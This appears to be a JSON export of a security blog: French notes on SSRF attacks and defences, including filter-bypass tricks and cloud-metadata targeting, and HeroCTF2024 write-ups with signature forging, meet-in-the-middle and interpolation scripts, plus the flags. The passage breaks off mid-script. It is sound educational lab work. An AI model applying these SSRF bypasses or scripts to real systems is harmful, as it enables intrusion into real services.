[ { "title": "Notes | Server-Side Request Forgery (SSRF)", "url": "/Notes/Web/server-side_request_forgery_(ssrf)", "categories": "Notes, Web", "tags": "Notes, Web", "date": "2024-11-02 00:00:00 +0100", "snippet": "Qu’est-ce qu’une vulnérabilité SSRF (Server-Side Request Forgery) ?La SSRF est une vulnérabilité qui permet à un attaquant de manipuler un serveur pour qu’il effectue des requêtes vers des ressources externes ou internes non prévues.En utilisant une SSRF, un attaquant peut contourner les firewallls, les ACLs (Access Control List) et les IPS (Intrusion Prevention System) et accéder à des services internes protégés.Dans une SSRF classique, un attaquant exploite une application web vulnérable pour forcer le serveur à accéder à des systèmes internes comme des bases de données, des services d’authentification ou des interfaces de gestion.Impact potentiel d’une SSRFUne attaque SSRF réussie peut permettre: L’accès à des données sensibles (fichiers de configuration, métadonnées d’instances cloud, etc.). La cartographie et le balayage des ports réseaux pour identifier des services ouverts. La compromission des services internes en exploitant des vulnérabilités supplémentaires. Dans certains cas, une exécution de code (RCE) sur le système distant.Types d’attaques SSRFLes attaques SSRF peuvent cibler soit le serveur lui-même, soit d’autres services internes.1. SSRF contre le serveur localL’attaquant manipule le serveur pour qu’il se connecte à lui-même en utilisant l’interface de loopback (localhost ou 127.0.0.1). Cela peut permettre d’accéder à des interfaces d’administration ou de gestion qui ne sont accessibles que depuis le réseau interne.Exemple: Un attaquant peut forcer le serveur à accéder à https://localhost/admin pour contourner les contrôles d’accès et accéder aux fonctionnalités d’administration. Il peut également forcer le serveur à accéder à https://localhost:8080/manager/html pour accéder à des interfaces de gestion qui est un service interne accessible uniquement depuis le réseau interne. Il est possible de récupérer l’adresse IPv6 du serveur en utilisant une SSRF. Par exemple, sur HTB, il n’y a généralement pas de véritable résolution DNS publique pour les machines, à moins que l’on ne soit sur des environnements spécifiques comme les Active Directory labs ou des challenges particuliers. Ainsi, impossible d’utiliser dig pour obtenir l’adresse IPv6 du serveur.Si vous découvrez une SSRF ou une méthode permettant au site web de faire des requêtes, vous pouvez envoyer une requête vers votre propre serveur en utilisant l’IPv6 de votre serveur. Cela vous permet d’obtenir l’adresse IPv6 du serveur cible. Si le pare-feu filtre les requêtes IPv6 différemment, il est parfois possible d’accéder à des services qui ne sont pas protégés de la même manière qu’en IPv4.2. SSRF contre des services internesUn attaquant peut également manipuler le serveur pour accéder à des systèmes non exposés publiquement mais accessibles par le serveur.Exemple: Accéder à http://192.168.0.15/admin pour exploiter un service interne.3. SSRF aveugleDans certains cas, l’attaquant ne voit pas directement la réponse de la requête envoyée, mais peut en déduire le succès via des indices indirects tels que des retards de réponse ou des erreurs d’accès.Techniques de contournement des protections SSRFLes applications tentent souvent de limiter les attaques SSRF par l’utilisation de liste noire ou blanche. Cependant les attaquants peuvent contourner ces protections grâce à diverses techniques. Utilisation d’alternatives de l’adresse IP: 127.0.0.1 peut être écrite 2130706433 en décimal, 017700000001 en octal, ::1 en IPv6, etc. Encodage d’URL: Des caractères comme @, # ou // peuvent être utilisés pour tromper la validation de l’URL. Exploitation des redirections ouvertes: Profiter d’une redirection non sécurisée pour se rediriger vers la cible réelle. Utilisation de schéma d’URL inhabituel: Les schémats comme file:// ou dict:// peuvent donner accès à des fichiers locaux ou d’autres services réseau.Points d’entrée d’une SSRFLes points d’entrée d’une SSRF sont souvent facile à trouver car beaucoup des requêtes contiennent URLs entiers. D’autres points d’entrée sont plus difficiles à identifier.URLs partiellesParfois, une application peut prendre un hostname ou une partie de l’URL comme entrée. Celle ci est incorporé dans une URL complète au niveau backend.Exemple, dans une application qui prend un nom de domaine comme entrée, l’utilisateur peut entrer un nom de domaine partiel comme www.example.com ou example.com. Cette partie est alors intégrée dans l’URL de la requête, comme https://www.example.com/admin.Cette exemple est simple mais parfois l’exploitation peut être limité car on ne contrôle par tout l’URL.URL dans les formats de donnéesCertaines applications peuvent transmettre des URL dans des formats de données tels que JSON ou XML.Par exemple, si une application accepte des données en format XML et les parses, celle-ci peut être vulnérable aux injections XXE (XML External Entity). Cette application pourrait aussi être vulnérable aux SSRF via l’exploitation de la XXE.Referer headerCertaines application utilisent le header Referer à des fins de tracking et de statistiques. Certains site visitent le site précisé dans le referer pour analyser le contenu de la page, le type de balise utilisée, etc. Ainsi l’en-tête Referer peut être utilisé comme un point d’entrée pour une SSRF dans ce type de cas assez spécifique.Exemples de scénarios Balayage de ports internes : L’attaquant cartographie les ports ouverts sur des serveurs internes en envoyant des requêtes et en mesurant le temps de réponse. Accès aux métadonnées des services cloud : Sur AWS, les métadonnées de l’instance sont accessibles via http://169.254.169.254/. L’attaquant peut extraire des informations sensibles, comme des informations d’authentification. Exécution de commandes à distance : En utilisant des SSRF pour accéder à des services sans authentification comme Redis ou Memcached, un attaquant peut mener des attaques RCE (Remote Code Execution). Prévenir les attaques SSRFPour prévenir les attaques SSRF, il est nécessaire d’appliquer plusieurs couches de sécurité:Contrôle réseau Segmenter le réseau: Limite l’accès aux ressources critiques. Règles de pare-feu strictes: Appliquer des règles “deny-all” pour limiter l’accès aux réseaux internes.Contrôle applicative Validation stricte des entrées: Vérifiez et nettoyer toutes les entrées utilisateur. Listes blanches d’URL: On n’utilise pas de liste noire. Autoriser uniquement les domaines ou IP spécifiques absolument nécessaires. Désactiver les schémas d’URL inutiles: Restreindre les schémas aux seuls schémas nécessaires (ex: http, https). Filtrage des réponses: Ne pas renvoyer les réponses brutes au client. Filtrer les réponses pour ne renvoyer que les données nécessaires.Protéger les services internes Authentification des services: Protéger les services critiques par authentification même sur des réseaux internes. Limiter les permissions: Appliquer le principe du moindre privilège pour limiter l’accès aux services internes.Surveillance et détectionUtiliser des outils de détection pour identifier les vulnérabilités SSRF et les attaques qui peuvent les exploiter.ConclusionLes vulnérabilités SSRF représentent une menace sérieuse pour architectures modernes. En 2021, celle-ci apparaît comme une catégorie à part entière dans le TOP 10 des vulnérabilités des applications web de l’OWASP. L’essor des environnements cloud et des API favorisent la présence de ces attaques. Bien qu’il soit difficile de les prévenir complètment, une défense en profondeur combinant une segementation réseau, une validation strictes des entrées et une configuration adéquates des services internes peut réduire les risques.Sources Portswigger - SSRF OWASP - SSRF vaadata blog - comprendre la vulnérabilité web SSRF Cyberuniversity - SSRF : Qu’est-ce que c’est ? Acunetix - SSRF Blackhat - Exploiting URL Parser In Trending Programming Languages OWASP - SSRF cheat sheet OWASP - Top 10 PayloadsAllTheThings - SSRF" }, { "title": "CTFs | HeroCTF2024 | Web | PrYzes", "url": "/CTFs/HeroCTF2024/Web/PrYzes", "categories": "CTFs, HeroCTF2024, Web", "tags": "CTFs, HeroCTF2024, Web", "date": "2024-10-28 00:00:00 +0100", "snippet": "PrYzesIn this challenge, we are given an URL. On the home page, there is a button to “claim Prizes”. When we press it, it tells us to come back later.Here there are two options. The first one is that the time is checked server-side. In this case, we cannot influence it.The second option is that the time is provided by the web browser.Here is the request sent to get the prize.POST /api/prizes HTTP/1.1Host: web.heroctf.fr:5000User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brcontent-type: application/jsonx-signature: 70dd8e8beb99014596cf94d119aff411d7ef75c517c65f41e3845dc95293e25eContent-Length: 22Origin: http://web.heroctf.fr:5000Connection: keep-aliveReferer: http://web.heroctf.fr:5000/Priority: u=0{\t\"date\": \"28/10/2024\"}If we try to change the date, we are told that the signature is invalid.In fact, the x-signature header is the sha256 hash in hexadecimal of the json sent.Here are the parts of the code that tells us that.def compute_sha256(data):\tsha256_hash = hashlib.sha256()\tsha256_hash.update(data.encode(\"utf-8\"))\treturn sha256_hash.hexdigest()## Stripped ##json_data = json.dumps(data)expected_signature = compute_sha256(json_data)So we just need to change the signature of our request to the sha256 hash of our json.We can generate the hash using this code:import hashlibimport sysimport jsondef compute_sha256(data):\tsha256_hash = hashlib.sha256()\tsha256_hash.update(data.encode(\"utf-8\"))\treturn sha256_hash.hexdigest()if __name__ == \"__main__\":\tdate = sys.argv[1]\t\t# Create a dictionary to hold the date\tdata = {\t\"date\": date\t}\t\t# Convert the dictionary to a JSON string\tjson_data = json.dumps(data)\t \thash_date = compute_sha256(json_data)\tprint(\"Hash:\", hash_date)python sign.py \"28/10/2150\"Hash: 18963d9e1a478e4d95da6845eab2ba325c104ef3c495659b5f7d9c1168aa672aNow we change the x-signature header to the new value and retrieve the flag.Flag: Hero{PrYzes_4r3_4m4z1ng!!!9371497139}" }, { "title": "CTFs | HeroCTF2024 | Crypto | Paranoia", "url": "/CTFs/HeroCTF2024/Crypto/Paranoia", "categories": "CTFs, HeroCTF2024, Crypto", "tags": "CTFs, HeroCTF2024, Crypto", "date": "2024-10-28 00:00:00 +0100", "snippet": "ParanoiaIn this challenge, we are given the following code.from cryptography.hazmat.primitives.ciphers.algorithms import AES, SM4from cryptography.hazmat.primitives.ciphers import Cipher, modesimport osclass Paranoia:def __init__(self, keys):\tself.keys = keys\tdef __pad(self, data: bytes, bs: int) -&gt; bytes:\treturn data + (chr(bs - len(data) % bs) * (bs - len(data) % bs)).encode()\tdef __encrypt(self, algorithm, data: bytes, key: bytes):\tcipher = Cipher(algorithm(key), modes.ECB())\tencryptor = cipher.encryptor()\treturn encryptor.update(data) + encryptor.finalize()def encrypt(self, data: bytes):\t\"\"\"\t🇨🇳 encryption to protect against the 🇺🇸 backdoor and\t🇺🇸 encryption to protect against the 🇨🇳 backdoor\t\tI'm a genius !\t\"\"\"\t\tdata = self.__pad(data, 16)\tdata = self.__encrypt(AES, data, self.keys[0])\tdata = self.__encrypt(SM4, data, self.keys[1])\treturn datawith open(\"flag.txt\", \"rb\") as f:\tflag = f.read()keys = [os.urandom(16) for _ in range(2)]paranoia = Paranoia(keys)banner = b\"I don't trust governments, thankfully I've found smart a way to keep my data secure.\"print(\"pt_banner =\", banner)print(\"ct_banner =\", paranoia.encrypt(banner))print(\"enc_flag =\", paranoia.encrypt(flag))# To comply with cryptography export regulations,# 6 bytes = 2**48 bits, should be bruteforce-proof anywayfor n, k in enumerate(keys):\tprint(f\"k{n} = {k[3:]}\")We are also given the following output:pt_banner = b\"I don't trust governments, thankfully I've found smart a way to keep my data secure.\"ct_banner = b\"\\xd5\\xae\\x14\\x9de\\x86\\x15\\x88\\xe0\\xdc\\xc7\\x88{\\xcfy\\x81\\x91\\xbaH\\xb6\\x06\\x02\\xbey_0\\xa5\\x8a\\xf6\\x8b?\\x9c\\xc9\\x92\\xac\\xdeb=@\\x9bI\\xeeY\\xa0\\x8d/o\\xfa%)\\xfb\\xa2j\\xd9N\\xf7\\xfd\\xf6\\xc2\\x0b\\xc3\\xd2\\xfc\\te\\x99\\x9aIG\\x01_\\xb3\\xf4\\x0fG\\xfb\\x9f\\xab\\\\\\xe0\\xcc\\x92\\xf5\\xaf\\xa2\\xe6\\xb0h\\x7f}\\x92O\\xa6\\x04\\x92\\x88\"enc_flag = b\"\\xaf\\xe0\\xb8h=_\\xb0\\xfbJ0\\xe6l\\x8c\\xf2\\xad\\x14\\xee\\xccw\\xe9\\xff\\xaa\\xb2\\xe9c\\xa4\\xa0\\x95\\x81\\xb8\\x03\\x93\\x7fg\\x00v\\xde\\xba\\xfe\\xb92\\x04\\xed\\xc4\\xc7\\x08\\x8c\\x96C\\x97\\x07\\x1b\\xe8~':\\x91\\x08\\xcf\\x9e\\x81\\x0b\\x9b\\x15\"k0 = b'C\\xb0\\xc0f\\xf3\\xa8\\n\\xff\\x8e\\x96g\\x03\"'k1 = b\"Q\\x95\\x8b@\\xfbf\\xba_\\x9e\\x84\\xba\\x1a7\"In the Paranoia challenge, we are presented with a python script that encrypts using a combination of two encryption algorithms: AES and SM4.Understanding the ChallengeThe script generates two random 16-bytes keys.keys = [os.urandom(16) for _ in range(2)]Here is the encryption process: The data is padded to a 16-bytes multiple. The data is encrypted using AES and the first key (keys[0]). The data is then encrypted using SM4 and the second key (keys[1]).def encrypt(self, data: bytes):\t\"\"\"\t🇨🇳 encryption to protect against the 🇺🇸 backdoor and\t🇺🇸 encryption to protect against the 🇨🇳 backdoor\t\tI'm a genius !\t\"\"\"\t\tdata = self.__pad(data, 16)\tdata = self.__encrypt(AES, data, self.keys[0])\tdata = self.__encrypt(SM4, data, self.keys[1])\treturn dataWe have the banner plaintext and ciphertext. We have the flag encrypted and the 13 last bytes of each key.SolutionBrute forcing 6 bytes is 256⁶ = 2.8*10**14 that is too much.However we have the plaintext and ciphertext of the banner and the encryption process is made of two algorithms. We can use that to our advantage.We can calculate intermediary results. So we have to encrypt the banner using AES and the the first key. We store all the intermediary results. We have 256**3=16777216 results. Brute-force is feasible.Then we decrypt the banner ciphertext using SM4 and the second key. . We have 256**3=16777216 results.Then we compare the intermediary results to find a correlation.So by calculating 2*256**3=33554432, we can brute force the keys.Then we just have to decrypt the flag.Here is the full script:from cryptography.hazmat.primitives.ciphers.algorithms import AES, SM4from cryptography.hazmat.primitives.ciphers import Cipher, modesimport itertoolsfrom tqdm import tqdm# Données et clés partielles connuespt_banner = b\"I don't trust governments, thankfully I've found smart a way to keep my data secure.\"ct_banner = b\"\\xd5\\xae\\x14\\x9de\\x86\\x15\\x88\\xe0\\xdc\\xc7\\x88{\\xcfy\\x81\\x91\\xbaH\\xb6\\x06\\x02\\xbey_0\\xa5\\x8a\\xf6\\x8b?\\x9c\\xc9\\x92\\xac\\xdeb=@\\x9bI\\xeeY\\xa0\\x8d/o\\xfa%)\\xfb\\xa2j\\xd9N\\xf7\\xfd\\xf6\\xc2\\x0b\\xc3\\xd2\\xfc\\te\\x99\\x9aIG\\x01_\\xb3\\xf4\\x0fG\\xfb\\x9f\\xab\\\\\\xe0\\xcc\\x92\\xf5\\xaf\\xa2\\xe6\\xb0h\\x7f}\\x92O\\xa6\\x04\\x92\\x88\"k0_partial = b'C\\xb0\\xc0f\\xf3\\xa8\\n\\xff\\x8e\\x96g\\x03\"'k1_partial = b\"Q\\x95\\x8b@\\xfbf\\xba_\\x9e\\x84\\xba\\x1a7\"enc_flag = b\"\\xaf\\xe0\\xb8h=_\\xb0\\xfbJ0\\xe6l\\x8c\\xf2\\xad\\x14\\xee\\xccw\\xe9\\xff\\xaa\\xb2\\xe9c\\xa4\\xa0\\x95\\x81\\xb8\\x03\\x93\\x7fg\\x00v\\xde\\xba\\xfe\\xb92\\x04\\xed\\xc4\\xc7\\x08\\x8c\\x96C\\x97\\x07\\x1b\\xe8~':\\x91\\x08\\xcf\\x9e\\x81\\x0b\\x9b\\x15\"# Fonction de déchiffrement SM4def decrypt_sm4(data, key):\tcipher_sm4 = Cipher(SM4(key), modes.ECB())\tdecryptor_sm4 = cipher_sm4.decryptor()\treturn decryptor_sm4.update(data) + decryptor_sm4.finalize()# Fonction de chiffrement AESdef encrypt_aes(data, key):\tcipher_aes = Cipher(AES(key), modes.ECB())\tencryptor_aes = cipher_aes.encryptor()\treturn encryptor_aes.update(data) + encryptor_aes.finalize()# Fonction de déchiffrement AESdef decrypt_aes(data, key):\tcipher_aes = Cipher(AES(key), modes.ECB())\tdecryptor_aes = cipher_aes.decryptor()\treturn decryptor_aes.update(data) + decryptor_aes.finalize()# Étape 1 : Génération d’une table intermédiaire avec AES et texte clair connudef generate_intermediate_map():\tintermediate_map = {}\ttotal_combinations_k0 = 256 ** 3\t\twith tqdm(total=total_combinations_k0, desc=\"Génération de la table intermédiaire avec AES\") as pbar:\t\tfor missing_bytes_k0 in itertools.product(range(256), repeat=3):\t\t\tk0_full = bytes(missing_bytes_k0) + k0_partial\t\t\tencrypted_pt = encrypt_aes(pt_banner[:16], k0_full) # Chiffrement du premier bloc\t\t\tintermediate_map[encrypted_pt] = k0_full # Associe le résultat intermédiaire avec la clé AES\t\t\tpbar.update(1) # Mise à jour de la barre de progression\treturn intermediate_map# Étape 2 : Recherche des clés avec la correspondance sur `ct_banner`def find_keys(intermediate_map):\ttotal_combinations_k1 = 256 ** 3\twith tqdm(total=total_combinations_k1, desc=\"Brute-forcing SM4 keys\") as pbar:\t\tfor missing_bytes_k1 in itertools.product(range(256), repeat=3):\t\t\tk1_full = bytes(missing_bytes_k1) + k1_partial\t\t\tdecrypted_ct = decrypt_sm4(ct_banner[:16], k1_full) # Déchiffre le premier bloc\t\t\tif decrypted_ct in intermediate_map: # Correspondance trouvée\t\t\t\tk0_full = intermediate_map[decrypted_ct]\t\t\t\tprint(\"Clés trouvées !\")\t\t\t\tprint(\"Clé complète k0:\", k0_full)\t\t\t\tprint(\"Clé complète k1:\", k1_full)\t\t\t\treturn k0_full, k1_full\t\t\tpbar.update(1) # Mise à jour de la barre de progression\treturn None, None# Étape 3 : Vérification du flag en utilisant les clés trouvéesdef decrypt_flag(k0_full, k1_full):\t# Déchiffrement du flag entier\tdecrypted_intermediate = decrypt_sm4(enc_flag, k1_full) # Première étape avec SM4\tdecrypted_flag = decrypt_aes(decrypted_intermediate, k0_full) # Deuxième étape avec AES\treturn decrypted_flag# Exécution de l'attaque en deux étapesprint(\"Étape 1 : Génération de la table intermédiaire avec AES...\")intermediate_map = generate_intermediate_map()print(\"Étape 2 : Recherche des clés avec SM4...\")k0_full, k1_full = find_keys(intermediate_map)if k0_full and k1_full:\t# Si les clés sont trouvées, déchiffrement du flag\tflag = decrypt_flag(k0_full, k1_full)\tprint(\"Flag déchiffré :\", flag.decode())else:\tprint(\"Les clés n'ont pas été trouvées.\")We get the flag!python decrypt.pyÉtape 1 : Génération de la table intermédiaire avec AES...Génération de la table intermédiaire avec AES: 100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████| 16777216/16777216 [01:01&lt;00:00, 272715.55it/s]Étape 2 : Recherche des clés avec SM4...Brute-forcing SM4 keys: 58%|██████████████████████████████████████████████████████████████████████████████▎ | 9733744/16777216 [00:35&lt;00:26, 268108.19it/s]Clés trouvées !Clé complète k0: b'If-C\\xb0\\xc0f\\xf3\\xa8\\n\\xff\\x8e\\x96g\\x03\"'Clé complète k1: b'\\x94\\xcb\\x92Q\\x95\\x8b@\\xfbf\\xba_\\x9e\\x84\\xba\\x1a7'Brute-forcing SM4 keys: 58%|██████████████████████████████████████████████████████████████████████████████▍ | 9751442/16777216 [00:35&lt;00:25, 270978.30it/s]Flag déchiffré : Hero{p4r4n014_p4r4n014_3v3ryb0dy_5_c0m1n6_70_637_m3!}" }, { "title": "CTFs | HeroCTF2024 | Crypto | Interpolation", "url": "/CTFs/HeroCTF2024/Crypto/Interpolation", "categories": "CTFs, HeroCTF2024, Crypto", "tags": "CTFs, HeroCTF2024, Crypto", "date": "2024-10-28 00:00:00 +0100", "snippet": "Understanding the challengeIn this challenge we are given this sage code:#!/usr/bin/sageimport hashlibimport rewith open(\"flag.txt\", \"rb\") as f: FLAG = f.read() assert re.match(rb\"Hero{[0-9a-zA-Z_]{90}}\", FLAG)F = FiniteField(2**256 - 189)R = PolynomialRing(F, \"x\")H = lambda n: int(hashlib.sha256(n).hexdigest(), 16)C = lambda x: [H(x[i : i + 4]) for i in range(0, len(FLAG), 4)]f = R(C(FLAG))points = []for _ in range(f.degree()): r = F.random_element() points.append([r, f(r)])print(points)flag = input(\"&gt;\").encode().ljust(len(FLAG))g = R(C(flag))for p in points: if g(p[0]) != p[1]: print(\"Wrong flag!\") breakelse: print(\"Congrats!\")Let’s try to explain it.with open(\"flag.txt\", \"rb\") as f: FLAG = f.read() assert re.match(rb\"Hero{[0-9a-zA-Z_]{90}}\", FLAG)First it opens the flag.txt file and retrieve the flag.Then it validates its format. So we know that the flag is composed of Hero{…} with 90 alphanumeric values inside.Then it defines a finite field of value 2**256 - 189.F = FiniteField(2**256 - 189)I will not go too much into details about the finite field. What is important to remember is that all results made in this finite field has to stay in this finite field so it will be modulo 2**256 - 189.Then a polynomial ring over the finite field is defined.R = PolynomialRing(F, \"x\")This polynomial ring will allow us to perform polynomial operations in the finite field F (modulo 2**256 - 189).We define two lambda functions H and C:H = lambda n: int(hashlib.sha256(n).hexdigest(), 16)C = lambda x: [H(x[i : i + 4]) for i in range(0, len(FLAG), 4)]The first function, H, calculates the SHA-256 hash of the input and converts it to an integer.The second function, C, takes an input string x, splits it into chunks of 4 bytes, and applies the hash function H to each chunk.Finally we create our function:f = R(C(FLAG))We cut the Flag into 24 times 4 bytes. Then we calculate the sha256 hash of each piece of flag. Then we create a polynomial ring over the finite field created before. The coefficients of the polynomial are the hash of the pieces of flag. Since we split the flag into 24 chunks of 4 bytes each, we get 24 coefficients. Therefore, the polynomial has a degree of 23 (since the degree is one less than the number of coefficients).polynomial = hash23 * x**23 + hash22 * x**22 + ... + hash1 * x + hash0 Now we calculate some points using the polynomial ring and return the results to the user.points = []for _ in range(f.degree()): r = F.random_element() points.append([r, f(r)])print(points)SolutionThe idea is to use the points given to find the polynomial. Since the coefficients are the sha256 of only 4 bytes, we can brute force it to find the flag.To retrieve the polynomial, we can use the Lagrange interpolating polynomial.Step 1: Retrieve pointsFirst we retrieve some points (At least 24 because we have a 23 degree polynomial).from pwn import *from tqdm import tqdmcontext.log_level = 'critical' # Set to 'error' or 'critical' for quiet modedef get_points_with_pwntools(host, port):\t# Connexion au serveur\tconn = remote(host, port)\t# Lecture de toutes les données jusqu'au prompt '&gt;'\tdata = conn.recvuntil(b'&gt;').decode()\tconn.close()\tpoints = []\t# Analyse des données pour extraire les points\tfor line in data.splitlines():\t\tif line.startswith(\"[\"):\t\t\t# Extraction des points en interprétant la chaîne comme une liste Python\t\t\tpoints = eval(line) # Attention : Utiliser eval seulement si on fait confiance aux données !\t\t\tbreak\treturn points def gather_multiple_points(host, port, attempts=10):\tall_points = []\tfor _ in tqdm(range(attempts)):\t\tpoints = get_points_with_pwntools(host, port)\t\tall_points.extend(points) # Ajoute les points de chaque tentative à la liste globale\treturn all_pointshost = \"crypto.heroctf.fr\"port = 9000all_points = gather_multiple_points(host, port, attempts=2)print(\"Points récupérés :\", all_points)with open('points.txt', 'w') as f:\tf.write(str(all_points))We get lots of points.python get_points.pyPoints récupérés : [[55361619050337373485334130558400312430139828913546101193721322616921549270592, 60459136230272697951319089507478684862723034071104645127149359374359714526868], [113513182871456145987257376498953879500259089849957244863431766355410929017688, 77088970405835611488054255487830361411650679974749003283269275963268988794563], [7675604436237254524147368259051775268028770330676975906489112873885258984774, 88202387666526328341668639270250094561947715971978224140441640632437204237492], [110647041453248341646122618660635208154004737142235068824212258613464323451297, 66890474188249515191060875799508993001490845028308290484780923808199344992900], [81471932851117260515074185394747166702901951903614644011741350519187361177641, 14219946126689514429291357009824564086486334120924720766151841217593508296853], [4350689840210487817942617929437324151098407060375246275512122559074363301222, 94142555077823312039905047019930620431566680283098378091085355654289271791575], [48460088634291497580372355464370161752484931365422300439434672590541993523020, 40872223599375606866306921234664721115914259995806653562924712676303581482787], [109743686064908075863137017692366596453928752753356854008373143618689226607765, 74412349244015678958621850670023025195914079586361806435978670581340664254915], [24154932717080459762802526665199897205637140271267733495556098650682464669335, 37865673089566789614761730883136594020244141473587796855351752685580850401107], [13126575697570085230622233319087972883099047012219956376434244417492718316232, 37209781070654285467127390078798999662408754132152305201452969909254212790072], [31744610063382875205679385751526141292037945522854184154668689748894245954822, 87472182277812250987699377697407598953254455239794138107381018297648026814483], [1442243778481128100385961337568513546954101916792189547573009615769489028109, 47023434988547153391814346516589642745870771224211379040127144021728518334447], [66224139444155648811049285795549351506544805810700053953984909402990896416366, 66404139535976063102640224241434471036665060592976158501399784980757534806114], [41461439613182772683012253295518628291515993709977054701286554068323534846012, 16330295345990736061514805879985347724272646618483594137046111575785970540833], [8124994071570040621229734817566774228784989167162205019618045527667502324007, 1174082109426394102730518553738813773417275575837947918633451526616375197167], [83113692806264696128134116275687348658183450705344835091143639214574822398174, 83421476058663195961650418002891751586836805889359636938922399552090992683204], [28549062372277010041830991620696184488733215028558487496898837291534457531255, 13862927826461560316439595239868835252479650083464344687830155997824206631276], [114541320096289446908092493313176644001493683370922610360910636611095616542135, 64263229271156792025562233883505261636307785827532445676019858162264426666860], [79212865431533533868263801407027824992329043668273173480645325260721492731132, 61765127366965148150628608780992069562912113390598619687060896605551714316614], [6798017878387417925629596479481982297549303328241672350012240787969831772167, 109025232046222777761751333963163133032127278273708152023387340236420044291906], [80487095604823741726531878909195066076724875760829609692066386002501035616651, 62264651607349362655973013244234114751436161721457181588960328546974017484400], [65245026594390116986342410775469939362649372196658717747018551701193166269379, 14146945547298032855977696797081113293961954473383200383619147025786955149147], [73133775860970628781448735251727713792321221549076305609823432389613318089780, 74259615229361298539668304479033365459518382561223200504307724445426025169411], [51291768727881444876901917074968403494731116529820173791904958750677515283671, 64204534720769021970866896533925489335278629743558372203822081530683399005798], [45499897046323593037978952467622006120320704683088367201021967000380763607181, 69571756380007774922668595838554418823215999134574589774840810316832719712978], [48198115884592158947336723948021332032098842339362631533117916829751876011352, 22500174263981691763865142524040235569531911790136740771935526314528282822778], [820672690295088195142022914935130831188660541645931911726394536487858188578, 81309358849274739104577531740652066756488802136195289435550597834613791823297], [93061210273863876343088376623199210055518550220347263220318303371600431308403, 58692783180418387338300133634662574892956621438255132724233767549110253048608], [40450609934438957688362437115278189726137232927610540747485588186657526142790, 89099031285624614753074398803552636846933106937839233694862556304263090354291], [64481140482014752265276689687633350561369017215192248497694249208794690660402, 16976567205669892486187639190833253393035752711850214493674732419007226833264], [47630215123252978823477350207409662022685843857723242111053509079761509793040, 22933456515851416638225620685048682518111706497209913423483653399017740421080], [28144384171633362019447425756568080120294433932404650239591897348830986718000, 85821204339087662915020211768245601216883301411260711641591222603344267089168], [87456957058570678891531244520766332157534715836750778857314175671320015274041, 17286638395604028756906348031805427618051543083962895740548658183158773792373], [87156546338551952946625193161395626354250314098983160966042105585772978726631, 1895716255633054076639826964977444276440980444855005257397268878676914651660], [89494369172505043117721786905747139204211278701311849270455624395433718743688, 74560657083643534110441238026319798797394657571804654494266969864917309323991], [111412853037874820188980373351552469849948432208013412126301404827062624043495, 39280748780352166978393978207738720047733993727467520483093075105997953810753], [83317887276225178669959717366484861828075759895983548068821890394885934967753, 74009104937269263400067277182852586066654988395469124244758383872869547435321], [92221762793277709169750385194639538355575565218286258581367642555210073608700, 17072214279833981797068284601533961555976133125156212217718862543315093006763], [1282850252461400288182247698737685554639273196587966925258261344400287588513, 84114078153740145051584218453071009330351535163884055487340528826393878432364], [50212904159368671056486669100980742670584755925485128093092259125319114411902, 85010909665755060128100927206230886284091392881945467868969800903638547067011], [100626361830225095358779001609417810640983439162808228983903144819006424218941, 114068225673043059329358127041926695430293291429087188831396530541915798398628], [71011664947357150195805234526057824900054367408710871523302237961838815793474, 47356424433933517952105568107301789985079258466876850764049727921682798026163], [102649267875612009562550049843187170048673490081328797702217239006341842452681, 44263965868835237924053802657488783993673018987136487030700050256547888345394], [23252791113155259750701732467588417432864890872068084744435372938070779834861, 50245748246392014348288065043120262007243131665199447408625996679236013683332], [32610831830736173663868293748154509352679934983141253057182768743877757234111, 29724639170834629529011233283985855331941259080651281363796374722472440226177], [47808833375673454234307754438909167034041246126040078202292284870371899417883, 11374823219991361712717962802587951731035448911716915903966262174705688042985]]Step 2: Find the polynomialI used Lagrange interpolation polynomial, in sage, to find the polynomial.# Utiliser SageMath pour exécuter ce codeimport ast# Spécifie le corps fini de taille 2^256 - 189field_size = 2**256 - 189F = FiniteField(field_size)# Points récupérés du serveurwith open('points.txt', 'r') as f: data = f.read()points = ast.literal_eval(data)# Calcul de l'interpolation de LagrangeR = PolynomialRing(F, 'x')L = R.lagrange_polynomial(points)print(\"Polynôme obtenu :\", L)with open('polynomial.txt', 'w') as f: f.write(str(L))sage interpolation.sagesage interpolation.sagePolynôme obtenu : 91356407137791927144958613770622174607926961061379368852376771002781151613901*x^23 + 58688474918974956495962699109478986243962548972465028067725936901754910032197*x^22 + 71177914266346294875020009514904614231152252028035180341047573071890295627281*x^21 + 9286536496641678624961072298289256247776902880262474453231051084428770229931*x^20 + 48478433129988933656911497337570454952912987663301800112434018755270886790086*x^19 + 105484582062398143020926667398250530293520625898492636870365251172877956081489*x^18 + 91842050171741174464568525719602040646922469791657773826919079592778110767648*x^17 + 43594818259201189283635356607462328520192502107771693650896092861477784342431*x^16 + 66681440692524165569992671994842901187406728987456386756946647843877275534778*x^15 + 7092396080272228853132842491037895182885372693653833621714864119915575351959*x^14 + 115533839068795212658451397535765278473898133068309149603041276877934373391258*x^13 + 32403908412257070302225532346590438994349383666861558172214850130936584778364*x^12 + 15596341609452054024790211046165535925702287406391095849367220616094959319247*x^11 + 98676420105970876355731743378079563095438931888109560800924537433679751968410*x^10 + 4587316730151077745530345853110346550953429707066041958662730783235705675823*x^9 + 4244268215373067710299345981438357655695365045434952475766578691548900068884*x^8 + 78645989056858155953548111309497253790838184388240819797824701948971210482613*x^7 + 10009681240064642703458239750230614173777134131788316383198404412696086812123*x^6 + 16605552275238206773988750913306730384585706182539455749829662274657349564685*x^5 + 42828444749577646348433379946210116268681295505955485156998041972023283883825*x^4 + 78252810134582863205690878209501272813895928209727562041762503202357420752872*x^3 + 54922548012150305957596790093591596584466927559339793497872781061995644787934*x^2 + 37382279584575671665412736907293996338695993273870192478675632069138612724862*x + 51862623363251592162508517414206794722184767070638202339849823866691337237984Step 3: Brute force each coefficient to find the flag. The character set includes digits, uppercase and lowercase letters, underscores, and braces {}. Total characters: 10+26+26+1+2=65. Total combinations per segment: 65**4=17,826,5625654=17,850,625, which is feasible for brute-forcing.import hashlibfrom itertools import productimport re# Ensemble de caractères possiblescharset = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}\".encode()#print(charset)# Exemple de chaîne contenant le polynômewith open('polynomial.txt', \"r\") as f:\tpolynomial_str = f.read()# Expression régulière pour capturer les coefficients uniquementpattern = 